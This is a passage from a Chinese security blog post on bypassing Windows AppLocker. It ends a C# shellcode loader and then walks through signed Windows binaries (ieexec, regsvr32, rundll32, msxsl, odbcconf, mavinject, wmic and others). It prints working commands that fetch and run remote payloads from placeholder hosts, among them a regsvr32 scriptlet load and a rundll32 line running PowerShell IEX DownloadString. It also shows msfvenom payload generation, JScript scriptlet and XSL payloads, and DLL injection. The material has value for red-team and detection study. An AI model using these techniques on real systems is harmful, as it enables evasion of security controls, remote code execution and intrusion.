</span><br><span class="line">            UInt32 threadId = 0; </span><br><span class="line"></span><br><span class="line">            // prepare data </span><br><span class="line"></span><br><span class="line">            PROCESSOR_INFO info = new PROCESSOR_INFO(); </span><br><span class="line">            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); </span><br><span class="line">            Marshal.StructureToPtr(info, pinfo, false); </span><br><span class="line">            </span><br><span class="line">            // execute native code </span><br><span class="line"></span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); </span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF); </span><br><span class="line"></span><br><span class="line">            // retrive data </span><br><span class="line"></span><br><span class="line">            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); </span><br><span class="line">            Marshal.FreeHGlobal(pinfo); </span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern IntPtr GetModuleHandle( string moduleName ); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern UInt32 LoadLibrary( string lpFileName ); </span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)] </span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">        </span><br><span class="line">        [StructLayout(LayoutKind.Sequential)] </span><br><span class="line">        internal struct PROCESSOR_INFO </span><br><span class="line">        &#123; </span><br><span class="line">            public UInt32 dwMax; </span><br><span class="line">            public UInt32 id0; </span><br><span class="line">            public UInt32 id1; </span><br><span class="line">            public UInt32 id2; </span><br><span class="line">            public UInt32 dwStandard; </span><br><span class="line">            public UInt32 dwFeature; </span><br><span class="line"></span><br><span class="line">            // if AMD </span><br><span class="line">            public UInt32 dwExt; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后MSF设置监听。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjk3smpeyj30ko07jwgr.jpg" alt="14.png"></p>
+<p>使用python随意设置一个快捷的http服务器，目标机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe</span><br></pre></td></tr></table></figure>
+<p>目标即可返回一个shell回来，caspol.exe -s off是为了避免我们的木马被标记为不受信任的软件。</p>
+<h3 id="InfDefaultInstall-exe"><a href="#InfDefaultInstall-exe" class="headerlink" title="InfDefaultInstall.exe"></a>InfDefaultInstall.exe</h3><p>InfDefaultInstall.exe是一个用来进行inf安装的工具，具有微软签名，存在路径为：</p>
+<ul>
+<li>C:\Windows\System32\Infdefaultinstall.exe</li>
+<li>C:\Windows\SysWOW64\Infdefaultinstall.exe</li>
+</ul>
+<p>我们也可以用它来绕过一些限制。用法就是直接该文件后面跟你的inf文件即可。</p>
+<p>它的执行流程如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbkkveyidpj30if084t8x.jpg" alt="1.png"></p>
+<p>作者给出的poc地址如下：</p>
+<p><a href="https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a" target="_blank" rel="noopener">https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a</a></p>
+<p>思路也和图中那样，使用shady.inf去调用远程的sct后门。</p>
+<p>不过他的调用需要更高的权限，我在win10下运行的截图：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkl04xz4rj30ce08d0ti.jpg" alt="2.png"></p>
+<h3 id="Mavinject-exe"><a href="#Mavinject-exe" class="headerlink" title="Mavinject.exe"></a>Mavinject.exe</h3><p>Mavinject是win10上面自带的windows组件，我们可以用它来进行dll注入，并绕过部分限制。</p>
+<p>用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mavinject32.exe &lt;PID&gt; &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure>
+<p>常见路径如下：</p>
+<ul>
+<li>C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe</li>
+<li>C:\Windows\System32\mavinject.exe</li>
+<li>C:\Windows\SysWOW64\mavinject.exe</li>
+</ul>
+<p>但是我本地复现的时候并没有成功注入，但是也没有什么提示，不知道具体原因是什么，版本为：<br>    10.0.15063.0 (WinBuild.160101.0800)</p>
+<p>应该是可以成功注入的，附上一张推特大佬成功的图。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbklidmmf7j31420jnn0d.jpg" alt="3.jpeg"></p>
+<h3 id="Msdeploy-exe"><a href="#Msdeploy-exe" class="headerlink" title="Msdeploy.exe"></a>Msdeploy.exe</h3><p>Msdeploy.exe是微软Web Deploy 中的一个组件，Web Deploy 主要是方便用户进行iis的迁移、搭建的工具。其中的Msdeploy.exe可以用来绕过applocker</p>
+<p>如果安装了的话，默认路径为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\IIS\Microsoft Web Deploy V3</span><br></pre></td></tr></table></figure>
+<p>我们以绕过bat脚本为例，看一下他的用法：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbklqdtv4ij30lx0aojre.jpg" alt="4.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=&quot;C:\xxx\xx.bat&quot;</span><br></pre></td></tr></table></figure>
+<p>结果我这个版本的系统绕过失败…</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkltrgjqdj30oy08hq2y.jpg" alt="5.png"></p>
+<p>有兴趣的可以多尝试几个系统。</p>
+<h3 id="MSIEXEC"><a href="#MSIEXEC" class="headerlink" title="MSIEXEC"></a>MSIEXEC</h3><p>MSIEXEC是Microsoft的应用程序，可用于从命令行安装或配置产品。这个其实不是很陌生的了，我之前也写过用它来进行提权的文章。我们假设可以执行msi文件，用它来绕过applocker对powershell的限制。</p>
+<p>先用msf生成一个msi文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f msi -p windows/exec CMD=powershell.exe &gt; powershell.msi</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkm5p28lpj30lo02o3z5.jpg" alt="6.png"></p>
+<p>windows下执行：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkma6w26aj30pz0fkt98.jpg" alt="7.png"></p>
+<p>成功绕过。</p>
+<h3 id="msxsl-exe"><a href="#msxsl-exe" class="headerlink" title="msxsl.exe"></a>msxsl.exe</h3><p>msxsl.exe是一个xml的转换器，带有微软数字签名。下载地址如下：</p>
+<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkoe7c4pcj30lm0cnt8s.jpg" alt="8.png"></p>
+<p>我们使用3gstudent来尝试绕过applocker对calc的限制，</p>
+<p>customers.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;script.xsl&quot; ?&gt;</span><br><span class="line">&lt;customers&gt;</span><br><span class="line">   &lt;customer&gt;</span><br><span class="line">      &lt;name&gt;John Smith&lt;/name&gt;</span><br><span class="line">      &lt;address&gt;123 Elm St.&lt;/address&gt;</span><br><span class="line">      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;</span><br><span class="line">   &lt;/customer&gt;</span><br><span class="line">   &lt;customer&gt;</span><br><span class="line">      &lt;name&gt;Mary Jones&lt;/name&gt;</span><br><span class="line">      &lt;address&gt;456 Oak Ave.&lt;/address&gt;</span><br><span class="line">      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;</span><br><span class="line">   &lt;/customer&gt;</span><br><span class="line">&lt;/customers&gt;</span><br></pre></td></tr></table></figure>
+<p>script.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot;</span><br><span class="line">      xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;</span><br><span class="line">      xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">      xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;</span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">	var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">      return nodelist.nextNode().xml;</span><br><span class="line">	  </span><br><span class="line">   &#125;</span><br><span class="line">&lt;/msxsl:script&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;</span><br><span class="line">&lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+<p>成功绕过：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkomhfkp8j30uz0gxdgj.jpg" alt="9.png"></p>
+<p>当然也可以执行我们的shellcode，具体参考：</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</a></p>
+<h3 id="odbcconf-exe"><a href="#odbcconf-exe" class="headerlink" title="odbcconf.exe"></a>odbcconf.exe</h3><p>ODBCCONF.exe是一个命令行工具，用来配置ODBC驱动程序和数据源名称。它可以执行rsp文件，并可以用来绕过applocker。</p>
+<p>用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf -f file.rsp</span><br></pre></td></tr></table></figure>
+<p>文件路径：</p>
+<ul>
+<li>c:\windows\system32\odbcconf.exe</li>
+<li>c:\windows\sysWOW64\odbcconf.exe</li>
+</ul>
+<p>具体的文件地址如下：</p>
+<p><a href="https://github.com/woanware/application-restriction-bypasses/tree/master/Bin/Net4.0/odbcconf" target="_blank" rel="noopener">https://github.com/woanware/application-restriction-bypasses/tree/master/Bin/Net4.0/odbcconf</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkp63g048j30nn0c53yg.jpg" alt="10.png"></p>
+<p>内置的dll已被执行,msf可以直接上线。</p>
+<h3 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h3><p>regsvr32是Windows命令行实用程序，用于将.dll文件和ActiveX控件注册和注销到注册表中。</p>
+<p>文件位置：</p>
+<ul>
+<li>C:\Windows\System32\regsvr32.exe</li>
+<li>C:\Windows\SysWOW64\regsvr32.exe</li>
+</ul>
+<p>下面为大家演示，绕过applocker上线。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkptlgrnnj30q20bq3yr.jpg" alt="11.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbkputkbjkj30m607mdhb.jpg" alt="12.png"></p>
+<p>scT文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line">&lt;registration         </span><br><span class="line">progid=&quot;Pentest&quot;       </span><br><span class="line">classid=&quot;&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;![CDATA[   </span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /k cd c:\ &amp; pentestlab.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/registration&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>
+<p>各参数的含义：</p>
+<ul>
+<li>静默不显示任何消息// / s</li>
+<li>不调用DLL注册服务器// / n</li>
+<li>要使用另一个IP地址，因为它不会调用DLL注册服务器// / i</li>
+<li>使用取消注册方法// / u</li>
+</ul>
+<p>除了本地执行，它还支持远程加载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+<p>sct我们使用ＧreatSct生成即可。</p>
+<h3 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h3><p>Rundll32是一个Microsoft二进制文件，可以执行DLL文件中的代码。由于此实用程序是Windows操作系统的一部分，因此可以用作绕过AppLocker规则或软件限制策略的方法</p>
+<p>先生成我们的payload：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbkqodplkzj30mn0a0422.jpg" alt="14.png"></p>
+<p>　目标机执行：<br>　<br>　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;);&quot;</span><br></pre></td></tr></table></figure></p>
+<p>上线：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbkqrwdm1oj30nf02mgm4.jpg" alt="15.png"></p>
+<p>除了远程之外，也可以本地上线：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll</span><br></pre></td></tr></table></figure>
+<p>也可以用来绕过对某些软件的限制，比如弹个cmd：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbkr1orp8rj30pn0a974c.jpg" alt="16.png"></p>
+<h3 id="Winword-exe"><a href="#Winword-exe" class="headerlink" title="Winword.exe"></a>Winword.exe</h3><p>windows下的word的文件，可用来调用dll，用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">winword.exe /l dllfile.dll</span><br></pre></td></tr></table></figure>
+<p>因为比较简单就不过多演示了。</p>
+<h3 id="Wmic-exe"><a href="#Wmic-exe" class="headerlink" title="Wmic.exe"></a>Wmic.exe</h3><p>WMIC是扩展WMI（Windows Management Instrumentation，Windows管理规范），提供了从命令行接口和批命令脚本执行系统管理的支持。</p>
+<p>我们同样可以用它来绕过applocker，比如简单的执行一个calc。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe process call create calc</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gblqw0h4sgj30ne0djmxj.jpg" alt="1.png"></p>
+<p>存在的路径如下：</p>
+<ul>
+<li>c:\windows\system32\wbem\wmic.exe</li>
+<li>c:\windows\sysWOW64\wbem\wmic.exe</li>
+</ul>
+<p>也可以使用下面的方法执行远程文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe process get brief /format:&quot;https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/appbypass/">Applocker_Bypass</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年02月21日 - 10:02</p>
+  <p><span>最后更新:</span>2020年02月21日 - 10:02</p>
+  <p><span>原始链接:</span><a href="/appbypass/" title="Applocker_Bypass">https://lengjibo.github.io/appbypass/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/appbypass/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/execl/" rel="next" title="execl钓鱼">
+                <i class="fa fa-chevron-left"></i> execl钓鱼
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/szsz/" rel="prev" title="记一次授权实战">
+                记一次授权实战 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">85</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">109</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
